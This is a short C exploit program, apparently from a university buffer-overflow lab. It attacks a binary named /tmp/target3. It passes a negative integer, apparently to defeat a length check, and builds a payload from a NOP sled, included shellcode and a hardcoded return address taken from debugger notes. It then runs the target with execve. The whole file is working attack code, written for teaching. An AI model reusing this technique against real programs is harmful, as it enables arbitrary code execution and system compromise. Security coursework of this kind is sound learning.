#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"
#define NOP 0x90

// Foo return address: 0x080485f1
// EBP address in foo: 0xbffffe58
// EBP value at the end of foo: 0xbffffe88
// Buf start: 0xbfffeb98
// widget_t size: 20 (2 * double(2 * 8 byte) + 1 * int(4 byte))

int main(void)
{
  char *args[3];
  char *env[1];


  char buf[5000] = "-214748124,";
  int i;
  int initial_size = strlen(buf);
  for(i = initial_size; i < 5000; i++)
    buf[i] = NOP;
  
  int shell_code_start = 2500;
  for(i = 0; i < strlen(shellcode); i++)
    buf[i + initial_size + shell_code_start] = shellcode[i];

  long *addr_ptr = (long*) (buf + initial_size + 4804);
  long addr = 0xbfffd918;

  *addr_ptr = addr; 

  args[0] = TARGET; args[1] = buf; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
